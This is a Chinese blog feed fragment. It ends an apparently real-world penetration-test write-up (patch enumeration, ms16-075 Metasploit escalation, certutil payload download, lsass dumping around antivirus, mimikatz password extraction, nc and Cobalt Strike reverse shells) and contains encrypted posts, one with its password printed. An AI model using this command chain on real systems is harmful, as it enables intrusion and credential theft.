loading="lazy"></p><p>通过PING获取域成员主机的ip地址，然后再用域管理wmic进行连接反弹shell，获取的ip如下(没包括域控和存在web漏洞的ip)</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/13.png" alt="" loading="lazy"></p><p>cobaltstrike上线0.4和0.7的主机</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/14.png" alt="" loading="lazy"></p><p>在对0.11主机进行连接时，ipc出现了错误代码86，指定的网络密码不正确。</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/15.png" alt="" loading="lazy"></p><p>应该是域管理限制了这个域用户登录这台主机，要其他域用户可能会登录，由于要system权限才可以利用mimikatz抓取密码，所以这里需要提权。</p><h4 id="域控提权"><a href="#域控提权" class="headerlink" title="域控提权"></a><strong>域控提权</strong></h4><p>systeninfo先查看下那些补丁<br>批量获取未打那些补丁</p><pre class=" language-cmd"><code class="language-cmd">systeminfo>micropoor.txt&(for %i in ( KB3164038 KB3141780 ... ) do @Type micropoor.txt|@find /i "%i"|| @echo %i you can fuck)&del /f /q /a micropoor.txt</code></pre><p>获取到 KB3164038(ms16-075)补丁没有打，metasploit提供了个exp</p><pre class=" language-shell"><code class="language-shell">use exploit/windows/local/ms16_075_reflection_juicyset payload windows/meterpreter/reverse_tcpset session 2set lhost ip地址set lport  端口</code></pre><p>成功提到system权限，可以利用mimikatz读取密码了。</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/16.png" alt="" loading="lazy"></p><p>由于域控上存在eset杀软，可以通过procdump+mimikatz读取密码<br>先下载procdump到域控上</p><pre class=" language-cmd"><code class="language-cmd">certutil.exe -urlcache -split -f http://xxx.xxx.xxx.xxx/procdump64.exe</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/17.png" alt="" loading="lazy"></p><p>执行：</p><pre class=" language-cmd"><code class="language-cmd">procdump64.exe -accepteula -ma lsass.exe lsass.dmp</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/18.png" alt="" loading="lazy"></p><p>将lsass.dmp下载本地利用mimikatz读取出密码明文(两部操作都需要管理员权限)</p><pre class=" language-cmd"><code class="language-cmd"> download C:/Windows/system32/lsass.dmp</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/19.png" alt="" loading="lazy"></p><p>下载到本地之后，mimikatz执行：</p><pre class=" language-cmd"><code class="language-cmd">mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords full"  > 1.txt</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/20.png" alt="" loading="lazy"></p><p>读取到5个用户明文，这里我只给一张图吧<br>最后登录0.11那个地址，由于cobaltstrike一直都不上线，我就采用的nc反弹</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/21.png" alt="" loading="lazy"></p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/22.png" alt="" loading="lazy"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;CobaltStrike反弹shell&quot;&gt;&lt;a href=&quot;#CobaltStrike反弹shell&quot; class=&quot;headerlink&quot; title=&quot;CobaltStrike反弹shell&quot;&gt;&lt;/a&gt;&lt;strong&gt;CobaltStrike反弹shell&lt;/
      
    
    </summary>
    
    
    
      <category term="渗透测试" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>对学校的某次渗透测试</title>
    <link href="http://yoursite.com/2019/08/07/%E5%AF%B9%E5%AD%A6%E6%A0%A1%E7%9A%84%E6%9F%90%E6%AC%A1%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    <id>http://yoursite.com/2019/08/07/%E5%AF%B9%E5%AD%A6%E6%A0%A1%E7%9A%84%E6%9F%90%E6%AC%A1%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</id>
    <published>2019-08-07T07:44:45.000Z</published>
    <updated>2020-05-14T07:31:02.519Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">输入密码，查看文章</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="a8c6a40e98316f3a60e3d398b89d99c159b967c09c63cbb9d0ce8b60466ed998">dd9f35a0f7a129882748da09be428af5</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      密码：TloveY
    
    </summary>
    
    
    
      <category term="渗透测试" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>实战渗透测试(一)</title>
    <link href="http://yoursite.com/2019/08/06/%E5%AE%9E%E6%88%98%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95(%E4%B8%80)/"/>
    <id>http://yoursite.com/2019/08/06/%E5%AE%9E%E6%88%98%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95(%E4%B8%80)/</id>
    <published>2019-08-05T16:00:00.000Z</published>
    <updated>2020-05-14T10:13:38.659Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">输入密码，查看文章</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="62e12fd3a0c8e8c64c41e16642bf9753550bdce90032d181ee4404049cf149ef">18d47651770175ba369f96b468a937c1fae81990cd09ae7f10976f586069165c4483d03c6e498ef14fa4d5ae0ef752257dacbc6baf2e25857651cec44e1c01242d3ca13053895409d995d627b75efbb7dbbba4f9f253030de45c462a6ebe7a9f0848bf9e1f5fc90d1844c2bcb9e52227631d59d0ab035dc0b039c567fc5578c445144e57e3dafeb031bba2a0bdf359ed5ab4f5bcdf2b4591968fc43f9912170b1ded31ff33e6167ec9f150da24985fcf78570c4913c2a53f8168fcab5a0e5e8ccc8f8793813e750598f1e9a46d4d5cdb963811e83dffa9fe67788a75c9d07ef5cce617bc250a18489980fc6101efd5f9ca71b7186647399a2478a8b5b6b07bed2552e5cba4424e57c83c028d79e2964d42121f2568062bf115ff9f9eb408f40a723620afd904b726db32fe3628f29ecfdb5d9465ba7c7d06fd2680eea97b9c4c69aa569d8d2390247e7874a49a7003f771d112f22f7d35287c67c7e7a4f5577917211da06f1beded79ed93a91759eb5567a1353f825c6fdb1d61c77ff18466e16c0ea39f848dfeb45b28792ed8218840168a263d9933baad1fe8e4fab66e5f1b7b0d522c2f3681370af0b939af59e8fde7ded75737f6c9ae95469a353e4efe7840868ef3f7a80e3ba2235d0e051d5064897f75cb2938cb5e4a98eb8ad53413e46450af1d54d6be9a0a21c3abdba8ca9517459a722a68eeb3116e7d5da8648eeb36e6ff108b6e372582dd43d71bc7688111ee3e6c4af2278f2e8b13cae6951d11a7f9380517ffc1c6bffc42bb42ebb54c691cfeeb8e9613fa41e82344d9fe742f6ab914a45a4e3e3ee199ea99f0a6ea8dd9fd3f8fbd2f2479a629226199806303fac5b206e382154454f4258a52d32fb973c44b075305002b1de34a276098985c27789626ee01eb8b9b38d9e8f1e99445f0137a340eebd75d20b8d1d8ff62ca6c0da9926d071c4335f336ca8ccd875ef7abfe76748a00332847f8464f98df7eee0e13cd960ddfbfb9af5de3c0467c8d01dcccc4e6239e6bcc17a8f2d6709b7aa44d5a14f61d5ed4a09a8c447dc8163ba3096e5581e6088f8ab1bcf1b6b2116931bf021db3c6f99f57f2ce2a611608883950bf088fb9fcd8d9820f32deeabffb1f305bd80d512f7983a5cb5bb448ec5a3d2dcbdbbdcba3528092509878b7489f737e55eb6070bc97730f7a4183b656d8f848e039dfd37cc91e54bdc969b29d08dc0b114e78bb74db3113d99bf2a89733be913703c5da3151aee1ad9cc4859ac7231c9abd531fac4a80a48cf9d74e4bc9737cbe0d49f3e9da2521429beb991efcf423c79bfcc629212c52532f8aa823f3f19824ce8a8ffbb542be76b47739be28e15259bf22bb3ba5bd8af20c1e104b70e1c5230646e5e3886bd716b2dc4418ee7401271620d3ef2a2896fb8717c4e1a2358fe6d63311f27d26e25516a1e693ae8c798021162b5e24124e567b2c27d4e750e1955db6cf0f09be9bac6bc1fea6e013c3528302f0956a6528858b250adfa73206157765c79a98a21c2bc8240f37ecc6a95bda998d55d8f0bccf213ba3e5bcda5d1a7c53cab435b73c643ad05285c69207abac3dd0f0b8a332b73f43ab502958fb5e9159c60fe1b42f43feb33e2ea041520099d7ddf634d113eb9876f249dce8514e7123e959966dcac45dfaa9ee3b8694e0898ea4b374b2b5c4d64ceab0ee4391e95934549db2326ff9d5af3fed7239cfec8223c6ed9565d5b97ebfa0190415b860f81688d72ec4d6f1c7c1d73838bba9b7ba283e5c76150ec7f5dbcebee3c3b1347d2ff355b383b2eb6379fe67031a3f1ee914b15d8a704bed4a67c19e0dc92a85ea67c523ed06a012875dcbdb09a9f69d93a99c2fc5ce69e7f4428be87985f1bf68f26d7a2d0121d3d3a25cbdc04cbb32d7fd7764f677ca793138b818983e9e324d24e76323a77a7033ddad5d61bc60d598261437b0973369a5881d3e5e0df0c6ea06bac22d86f9290187e4ced889bb0b249e882a82feb67020b85956bcb1b6bc7df7a2cdd0f15be3d978d5fbac2ca5716eec2b0e9437bce735a91ec60855d619c8907420eea0d6d16ed1bcd249af0328c9101e5a97a9f118793508039ab6a5c49149e18d6b67ddb22a03b177f48e98c08f2e462c605f43f1bb939d590324667613c257aae0e2bd209a9dcd8f9addb6bb328fb283f747f546e9d6c6405fa7dba16bd73a371850dca6c1d05b91f8e4dab7f7e88048ab9823327214641e1e5fa422cd6e9c8666c9c85264ff27dafa3e1dec27f250bdd292ee245112562899761be8e6f6e63e726f91fa24d52b84e85c785dc542e953c49852d28263ea16518f1a036e7807fa79821e6a84fc7f3a1b281ffdfe623eeedc1fc4929d7d943229a8c3e9826697594d4697033a0c5f1d008a64cd45e454bdbff3f84fad9d146838c4d66429a77c3a3c103c6fb3cab3a344ca5ca21a0a9464fdd1a346550a3270e7ab5411f392c10ee6108ca39bfa1c30bf9a9789334c36c68f4bbf7d8f8137382fccd9058dd2c63bdb2a15de88cb0b5db8c43d6cb37f75dfdd08169baab35764c5b4794f5d8921adb839e1c50910790d4063785dee89658e31498fa08240a141ff5309a91bc9e678d60fd2d294b78bd7093b6a92f95ed1300cfc45ace0c9cb79e1093363ddbb9e775f4db68754b870762afdb45c8bee2842686c911470a6894296f688b6332f9716364387f339ffb18f6e36d21f81964520d03dca756383ba0d54649826fab4001adadaf8f006345badb998f0795d2819ced213348fe16081fbed19e67e1636991ad532e3a0985addfab9bb6080bd4cde4e34a84d1a70bf96b38bae24b604b1f14d51b782014e0c5f1ea7870518222cd21c1e414ea8a00c4d8d03ac62515f922cd3873806eaf9df4b89ea4364790d5a0e7635dfaf18585a6b984efb891e582a7d7359303ae839f5845407e41c83026d85e1f6d9c4f74b19b3ce66f2bc226e4f6813b5f2c4ae8be4268da8c182fcdc0bba9418e41ce62152dc6e4d7fcd693c1d32f173e8fe3ff74b2c14596140957a3c0310112ff93edbcc794ef1cb8c31f52d905c832e08401c0ea8cbe7ae14a1ff9ae13e05564149a78d4506cc8347211b967a8db182c2cfcb720c9e72e5c33ab3f7a79bcedeeeed2664143a96393e68af43588647a20cef5de24e1f20659eac249c448a8e72ccdc41d61b07b0a112ee42961f09dcc3b347ef3ea43d891a8ae4aef7b7158288c44ab295c55a655652c8a24d276723a1c4d96918e56d6286eb26fe902b7ba45304ef18bde203fa64bce0ae82aef558dece751f9a81f36b4b14b09ba3a0a5ea8ba4914a68a78097a2f08163672bc5fba07c560fff486a761a1fe6c69279f60d13029d27a2c9907a3d571ee0b9f9375c23f80d1a29eab885bb0ba07d654d49bd7924a64fe2f05c3742d25921e7ebff4c7dc10e36328e9d80ca85f13dcfd23f1470c469ec69eb014218eb70fa5c05b87959fc8601f064ba7258277b704fef3e7b453e2968ad39e4acaea426840482709e594a4974ef5492178b6454468c84997155cb0afe87a923e1bc4de18d37cffa99272ef9bd355613a52980c950a52b538db77930959db8723102d6705a4d2d157a040c81391137b9f8fbf5b11793d92294a5b0e71e49b4221aba85a429347f9c765ecc8eee69feddd4badada40530c2e0a6dbde7c08a32a76cd6ebdd6561aed3622fa00697748c9c95683de7b3953d8de52e6619304905188387933fce58b0315c304f02aa03cafb049ffe3853a75a97309ed03c1923bd67d26fb9d43ad98b2d3112c1bb90d27093b83eb3dba4997400e1486fd04831d41dbaa82edec76fe6f987e97e9482d3cc667b6d29aba7cdb6cc5c2ae23f24a2e214ede4ec499b83e815d9dc905f34132112ea9e270fb36cc13d45b87acfaf716b17d31a4049a760d4d129a6f7e28ee5b239001d61970f318202307255e99cd04f24462e9f0eb5bc067dd4575eff7f8336715771324e9aa6dedd08e5d3b8b4f2c0e16494344bca1a920bd6fc877fe81dbc3b623e1ab550bc47870201eb6a9530ac2f4f88097512193e06156dba2dbc4ed204572123c71b967ff78cfbc81f95fc62ae72722cfe5323dd7a31cb755b08bee7833844dd9e5649eef9b2b3761de68f39aa4c2c671d4a3bc35bc709dcbfce2bb496b9a6f6cd4a9b5480a802021f87471ca1f892dd4e694c653eb0d9e3f4996697668bcd02a58a2b7a2dd263b84b0b01f290d412c50fe66f901ceec1a92658f8177b83acafc15e6da5f729ff1acd3a3e9d66d0862e1751bebe8e25088b5a44c5cddae2fb4de7130a5e22ceaa181fa57fdd07e65ab40e0fb5492282b876cf4c2855a5d6bc21e878fd05efe4d78913361200e0bb1b3dfdf625b6cc0ba714a5baf8b1a81742bd9e612b9a8e522bc263bb8edfbfbe01a7a0ae63d20debddb7ccbae7ca4c7ef3cf5bf87fd0f66fc027021a27e85b542a90d3a01a784c7144fb7f27a94f4525ac36c37d7cd6c587bec942f4eb90703c7e111a55e82999b5cccdd2cd43109d1ed79a33b5fb1e818d733e15fdeeadd14eac34aca43a714f3a287caa43e335ff2d37c4cf32d777f6ad77dd5713e193c5a1a78e2708a8f36f76f19c15be0021b60a9e6007e2376a5ac662498ea9eb9bd1f57a608e8fee935e629c4622c98822f82e516826a953514b2284b956633c58b1fe5eef9bf31aca0cd43c9bbc017c69a2588955f12489411b3dd4f3a74d0a2c2342b3d1db8ae6ba728c828f492517a0ede2015b7bfc2c66f1c3a78ba2a254bfa812b465f630c520234f7bd88bc8b4975bbd0de8b4901d4698ae389392a033a2aeb849c671d11dcb6ed985656774f605ac5bdc7ab7fab66b8375c2ca489742e92f3f5b898ace145bb692b912dbf2756e687f1e38689dbd96ba8dd70e2f222579a948322a55751e6a73c92dada6329ef166631313809529f94ab9fab4c162699c9a23884fd8f081697faa894b2293cdeaafa9b73b33613fb02a85891233b8ce79eb28f1189e3c22b699ad11507a1f5efb97d129b18091191e586f5e26744a12e49cce598eb29b59de6eb88ce90505dbdb47733533e561233654421b06c04ce02dc6019dd132e5a693ed420b2bd5bcad27d2c19782d71dfa87d24a3937fbb07755e046d70ce662f00f99dd0a2a8023683366930f1627f33049b22c432596c14bbe666d3688ad4c7fcd0510de95ee073e9c71479e0df14f2c334279bacfc7b3afbeff436dea67d8db2d18b85a6096ef402613662876061f675b6a9bdf4ff472624fc0b967bff78419f6a584c0fb9e4b21276b07beaa9e431489f7e5257a2dd610d59310e5b353041cc110c99bc28ca28139d8acbe8bd2654c32b307c1e3b56421f1149850d6ef213f0f09f2f7ebaed6629e0b342c770c2b7c4350b3d45b755287211f7818cee5cc50a4e10d7f50c85dc53bfd6d3af076f1077d852d601529e578113ec2c9f53af2683bdbf79b9bbf2ecbc6575b7d48f8bd70c2ea15579894725d72be96f03946c181a4c14bd1a99a51b5aee6a08789528fd8107d150e09226cd29f059798007bbbba2bf810b368b162f2992a17999b2b9dd44931b83de60ef9f9b49b25f78fe0b8e2d286591e5361b132e3f1d64863a8a098f5052030e2e4f071c9099a4e1519f0df9accd8f3e4915ae03800764e3d9c80a637c9082fff4a4ec216a00307b7998604da77dd06e7fe3bbd8c7c5fb991b751b140a184ca0f7e1eed0b3d4a6e4c837bba591dcc91516279f49488d033e96fb5c8fa18f515cb83189014ee1c6f2b0a64198be93ccf347bd5a1e9dfec5f5ca08f189cb1d43470aab4da307bae090e5a47e899936b4a9447464b9900f1635758806f5e8353197091ef81fa7ef65a7e322a333a4e3e76ae783f5fb09414425f828dcb4da5c91dc49744c8ca28e21c523fc2d72286bffb2d9dc5ea73977c52b832a19b746d592a196f7c138ea10040f5464843a8ec8f92f97a1b9b0d0f60db101e0d0d4c83aee81b25ea12ef54c3a639f719a5dfe707f84c70432ca09168434967b08db9277787fdea88eed1fab2a30d402a1e9f3e27322b5d39520bb23866bb44ca17989645366d2763af8e298714ef2022f7fced756119505cb8f9b66897ffcdcef4aa3d4ab716f1b28be45f48b2fed1685b8d2d8a671c4054bcb13be52c5076161f95bf93da494d2fececba7258836dde6d33ff471e3a2d0b5a97985606295de52d0a397e3591fb1ace77bb2b115355ddf280900640f718c2eaedf5282a840c095c30e7086c9c67cf1437a462a3467c510a0d9aacfd14b16d0bd75062326c4726ca9f4a6ef4b019dcab2d51b45f02cea061346f79ed9d05cf1dfdd8b8536af7df472fa6d977a3d38a6871bac7d8aeaf26c8f3f9b53d80be9104054da60abd41f2f50b1323e3d13416e9a94a2be8a5e47e8d0a3d08f319190e5f85ffa0ae6853cf51c477f2c0ed8453e113e41a37f15ff8c95564276a075f47693a259adc09452ff1a7491cd418bd3d33e6364480aaaef01064138c12d40ea1045154b132fd1e689f555870c36ffe72d4292533e36e7c32cdc73aac532a91b03032c9ea9ea98d1efaa22e500d549b9f579e0004bad2d988f35d7e5b625760cc6314b0e044cd070e0ebed35731b8ca5edf590e227fcb8c390adf8a9e697af7c7d0fb8e50c9934153f212198abe7f98a87904709d24d2b937fc2068c6f4c3bf0cc550970d3e93c76913cd15274b6ffda903df044964a8c6b0434e711c4d76727225fef48d0f98d1b14e934a4d20ca7c003d526d2f69678e043e92691d39a17e9feef334901e4f1511f8ec62b2e400f3b5b83ceb3217a63508c21578fb60eab30781863aae7d4130cfaf400a495b67cbbd56d0f817bb6aa40c89bb73eea5b6fe22b977359620daa69c00d6b94c1502cc35f04348d5cfd406ec22408e0f699b68d33b43d2d76fa3ede3c197477e52766c28c4b7462b0c14ec20627bbe7053570bc32cd3750b2f3ecafbfe66f6c4a69601308a8b9d2bcc237425c5f7b65aacce49f3c3ae896fb3c6dadbd0d45ae2a1740939d5f14b4f010cfc2cb63cac62bd4352adbb6e125f3e638c170f2a6426edb574f101218d0ec447c168372ee083e858bc233bfe1875672338fab19666b3958042e39427df21c5e052f1de17415ed90c4bdbb8e5675cd7548d783ece4a1142d04dd7e7b38627a5e72779c927367e64f765c48571194a72ee4d1403b12c365905685ec38148c7f9081abda7047f98de67b99d6656a69f601ec0a89761b6bf264216315ecc6c14cecc6c07e56b39c3b297e234ccc7f22111bf5822260c3b4963405dfa5b0ca25e59591b99df119c3c23bb7bde68f78689eb2081949b973f1f2bf481ab393f1f2f08195a6dff28fea84a81d2f307e44a4cc0beb66649599e0a7f4507ff278916f2f129a5f3527d4874749bbfce9217cc2f36a8d8b1b7c75b9ff492c1ac512013484c10a9ca95d143e09c379b56ddab8e1b476e771ce1dd9cf5d3b16bd3cd134fd37afca371ca564d19a2e069f16b7c9f206c3bd3e61d4760ee3f25c40830ef00595c1a6106c3316616ed84408014c3bcf08e42c9f410c4df8c000c814699b538f204ac21ecbc18e15ffe1656e0ab5fe53299de54349a27fca37629bfe62ac83d5e4d4b9ca2599a5e70fd42a5d8e5d6d58844d495ea771f736639c3d5debdf942bcba23cc86a953c09c26b5a169e57e714cacccc54d8b05fff2f864f5c9e1464e43ad2d4fe28d5ed4697352e6038340494469e795e5ae4ada0847e0432d689f60be1f0a7c316cbbe0c45f2476d1e87ce0c04735dcebed323899b1aaef75e99442376c30b183b0bdf59ba4d7b97ef073f1f32ec4c1c5aca865cf1e76da1a809dfcdb111e945d5f908606f1f8e1d1b2c1353b0fdcef12bf376e8c831dd427ff2fa21a708f4bbb183296dfdd71b93963c29edba34fa9c525513dc5a62565ddcbc19e1605dfd5f4d4fd809db81ce95030811f295ac58fe62e13704da46b42acdc7a1a7095bd7d762913711ad942f2c21216d0c4b0712879fa4d4679cd1adf8887a75dff0999b404980fca8a1cfc1a8ea9ab434846e8c29f18a5dd59013054d68bcbc7573cb9e183b8107b6e4109d3dd879e08ee685b82719178dafdfaef687d0b0aac50da9ae5fc3c6894caa7ad0c0d9b8f8ce20720fb3579d3b8b4ad1ac6cc5585197f89e8ef27d9644ed031bda96aa98e4c218157c648bd7db1e254d4b596ec9f255e001d1f3c045aff179b00182afb652206ec61a0c27a84d79a7dcb0c7f41a45c4d6fb092afabd9c318ff40c0b44e9a59879242fa8899b52aa2a9debaed53bd5007a3fd6740a96523dca9b1042f797162a4bd4e4a27669f538ffe000fc5a8d2e28fb26346000f539fce38ffe5d3028fe91e73e0374dff8257412a0066ec3bebd5e5fb4af8709ad9b0540f64ce3ffce99ab470d1f10d0b1456848bba57c2ac2a8eb334c9e9cb51fbcc282e87bca617d8e8ef300ebaaad48065c0f3466c7a75d6f8b6577c516a31dad730aaa0747c2e91e2e2ec46cb2d3066881f17a23cb4fb7fd8a825b3ba625c8377f8c851d770529bcd1c6b206e097342dd5454bd5c7d986001d2676f954e5734ce312d30cc6520ad7c99b2db309ddca3de0d60f7db03b970194e23cf8880dec90c9cbf163995e757d3df10d1e6b3ff9e801c773fd9dce2edd5694eb184372009e492afa071e69bad3c6b3a54ccfb7be68168574e40d185c76edec9d2752afc995a24ac4be56e95db7649955dc01ba7f870f7dbcb11dc383ba5d7e6f2d1e109d22dcdf242599602e835707c7490d5e8e446d812560cc71f65139ef8aa5f50bb0a1ce3856a38ba9d8c7bb835e6d0c078f3569d94041f61ffb3b26a823383d7690616e422ad910d6d216463d5d9b6f63bb382c23398ddce485334eeee44bab85409aa8c512317ec8af4f56dbe53bdc22dabe9138f1c5e9b963e90f9da882f26dd5e129c38d438165801b84807c831a5e32fce9310bb3cd838840ad0f4e55c612b389259446e68471f7e8e089004f32e61f67e1de353483db99f36413e2da0fd3d0e42ebecc4a3a8940347c0a11d485ad6711ad87afe78593a8ef743e5595c8e78fd8ecbf20f474b4e8da455970770bfc75d2295f7ba8a9a5f85a634ad3f44095e5c4f1f2ef5652bb20d997439dd50f2361e9f30ec403061751df278b99e35d14377a07bfb2c93b5076d74e32f498a9c73dbbeb14cb1c1a07fd6589f407a2296d4c99eb96cf080946590e9bfc579608579198d44036a0b109a3207beb72cce0240a658525141de983ce5197103380e1df6f14516f5e7b84f88db03894207ac5baf491f297dcbfe76c07bd374e0eda0f812812db98e62c5bf5e36ba9eee0b7e631c3c4f3462a94147a7cf2030109c8dccf7ff102e3e4dd2917f2f39ddefb581d4548bb18739d5ef4f068d61494ca7d6ca6b18407afbefbecdf3488c38c48b5bbb389b04f8107840349d46eeb85ba5d884ec6d44a0abc954b8130cf8c0b5968869b0708e792e5f7777340d5958cea2a2d99419af244dac53972190113d5a10c10055ae74f43a137fe05174acd253da0bd40410a7d816094ce6d94ab57bebe1695563efdb38e60384d61f83b759187b699c60a92fae4af65d04a612f7bf57aeecfdcd44a1fa5dfa852273e9689d9f5a6ad492ed612b7ae13a6a96e0643eaaa3485c64e61f6852e80ae05e98837decf26ba83e02a12ce22ffbc63eb75232de1e1b2f58f08d9d2507f018afcca1044b849cbd844ffeb323553434306d1cceba0aa87dc52996f6b467e5d949dcd9ce624998b1e42a565781953769c8cf216e599248e206534799c24e56dc9b042f025dfc9e3847e00175bbbdfdca070ef3cd7376706e69635e0295b92ed74f2fb733e2422f648028a583a1fb6b75dc395b76a3fac1f1614bb64d41a50400fcc8b1a258e0bb9231cd89b425644dea96eece27e7c3986ea0954858405037d2a120a6e0eaef7e3f840f8e696bd3d5073c1c9dafaa4bfd319dcdfcf17f9b62d86099e94733b426f7ec0eab05af70560dfeb61ba5bbfb8fcc0322c637e3a8bd4588cc6c1897f5ab4058580904d56df8d55bae0a3a0d975b4629071b647e05a84eb0b6aad60efdfa90866471ee94486dbbe67e5b5aba53691b832c0ebab0f6438e984436df5927d7da505917cab9b95e5d599644b691db407a5885b4204e60b53507e0bc5e681db800600689e3f81565c6b714ab397585861e1d8cc726724ae215562f0e942b6dcebadbef7aa29ce33590dbd4dc58103fc52cc260ec28d77fd302fb0cece926f10f8d706214103cb511ce30cc1f996eb6bb4ff661f43b5ab28c0d3cea1e080faa604888c624e6e7fea73d3387058442e980e687f5a6099c585787ccdf596a65a9f2a39dd39ffac8279b3f01a4ec6c6efa872646868fc002e73491f48d27433f0a75def5e64a0cd4b1410b2320e002d137a66c21cc6a0d3802951ea0129f3036c739728c39a629a0a1b06daee5f957ebab17c0b3a1e546ffb03bdc06236eac07e6bc2239c79218700c888bcb36458e1aa45a81be1b1c7e3e3568cab73c3171f3e58901606b8ffa63cf532f5624e83a9ae78c71bd498a0935a4ef9dcd372f88597ca8901dc97f5649891dd6f2e0b9e5fc72e929062c86481c615478c664697fdc2d9ea4d87e76694f67d786e0a9017e1e2d1f3b07ccb06b9bd4688ee424e37ca54f51b5d023a7edcc1168b4af603048a76f85c657cb99a6fff181a1290292d6778417b8564e547530a1f839318e52af368dd18cde52ed4747216f5b689aa1da1bffdb1c41ea9f433b7d822d35424539fbee17b3de339ca9bc6107896908479377f2e30508619b7964a7c92a172054a7adb5375b1df16760f7473dcc7bc2fd703d165750e0bd0ab3f94da91b80df0dd6ac6f59fd18314ea7acb67adfc00dc570b5f21c91021a65e50fb78da1a9abf1822a7784ed0d1f56f18aa0ed69dafa8ba6a4b1ada7acbe615d61c7204e822e34a3ca9c2df5972218767ca973445b96bb1dd81443b7fbae37ea2c79fb51dd5deca57a15d8560fcde91723d445523b888cc698c0046260bd9e0e1528a9a45a301c6b209255286010c969a5cf592293b5f5b472bc286293b9215c5c341513bdac8b895099d42421b8e78a626c95438baf38022c63463e74e05b121365b55efd07639cce1dd464a2f30878e66c6b398973b3105c3d3a4f5672db897c67cc236850cbbfd4034c9b137465394ea73b1f9ea2de0ff52b7ae228c097571f449b041b4202ebebea78e535cce7fb2ce89f24b82ad94efec5e10754c5cee5f46df2bd253ddca8d2aa377534473555d945a27c7b0a01a2dd28c882065b369cc36297a2307b1314d782d5c96ecd124413221cb9eb510ba26f548fda048f4acf720fef34759909ed495862addeb312418b3cf1ed8c26785ebfd48056aef17807c631a7fd75966a149db13772a9b91e9a31f325ddf48d6c35ab7f5c3df8b05daa03ddb6134ced5e7c89574d54499be27f9c7b4f3d1a864a0bce599eba7787ad823c7cecc4a81be06e5df201878c7a0661568a1311b34e2b5d83d165da488111c8be0174a5728fdb9013cb9d7fd22029185b1a4b380e86d02d821ddd27e06d39c44193bd87d8031c5d726b96ba786857cf5f9d0fb48df5bcbd8e6e0aaa1434b72c7cd47a1931a161f701961b95f2078c9050e16de7269e3f1b8420b72839a62855a94913a25d6e17157b2123c6ab22b1e2e811a5a38e777e3db3e2cdb8de519fad89d62f229acc0fdd0bd77b510b820d8bafda0c9b03fbd7fb8001410ca7e2d1f41e1900bae78a51466c8ef80c6ef3f5a116c0a83671eb03dac80633a51cbb4a248cc93266741e78aa0abb346bb47ae548e1908ba9224d8b7556a6aab7f7a91db805fe4ab5803fb2cc7da11ecf69b3c0c38a91e4018152370905677e63ce74cec5f8e5e5e86ac2a80327bb34e0d52818e4b0615fd8a568ff4b004d3a5dea64b224b10202b63f9d463ef3e35d162ed9fd5b13fbbb2c909d20c59f095052ce4435b679d5c2b33a6a56c79035e2b194c32c085343f761478dbcd8af6cbf9ddca9c98d2c695e9b54eb81876fdfc89b8404a0ed663d55a2cb4a95ad66ce6ca33dd26773230632c85a9af8d80cd80512b9b075401f0fed6f7d893bf8b2bccd6c30c24415ea6b9c205a4f25417b4d0834ca4828de3a91ef93e1b6f2abe5d7fe4b21b6cbed11ee4184c8e6702747a34b109ecf89d4ea02764561db5926bbd13bee64d833cc7037eefa63e846760d50e60e04f629022d9b1de8cccf4d7a640d18a84f19e6824cf682f696177c80290ebdb5b3d2af0cf286c6c51bf73efee68dd16fd8936a3cada7e8ea9fcaa3ee7e8de5f259d7afcd450ba77379ca3e62d1175262540a1e43c66bd8389cfcb6466d7b69fda00cd7da0a75da5ad6745fd72a8bd28728bb65c8ecf49dedb09ced76e963e2b12980a7541df6c589c2f380919b74326209df61dc640e8324554891184c4c8d0f4fd2633ec57a32a5f7b790d007ad4d98b59af3e6085925f7eeac0ef5060c504af724443a46ff95119ed130f41c8a9a4f1670a11b290af6cd50267a1d3332af9364d2e5336c0a9e6b81ced7654a6aeb3d81de9bc79524400c3a22d62106e575c8c76a20b0e2d5e25ba93f4a7c4c18f58f9d6b929d58bd7a844f864e37832842778840df5bab0f2da7e7b582e36c39f31e8e28eace00d54abc4a33c98a100527f0b682871ab3bf35f17aedbe21a714437530c9f046325ff9c40455121acc07c3da229a9062df9534b3b5be78f53cbd8f445bd0765c1dc21f66b61643faaaa75527d60250dc06d85cdb51f6f596def919152d599b2fcf30c32bbc67685516344c3b99930f5f5c4f8a52aae9a7d636b241149366a5d255493a451b4322e38ef23a7efb967d7a1b318297d798db228de8a5f72ad04e1ad5b4c3382a9f004eb0ca8486b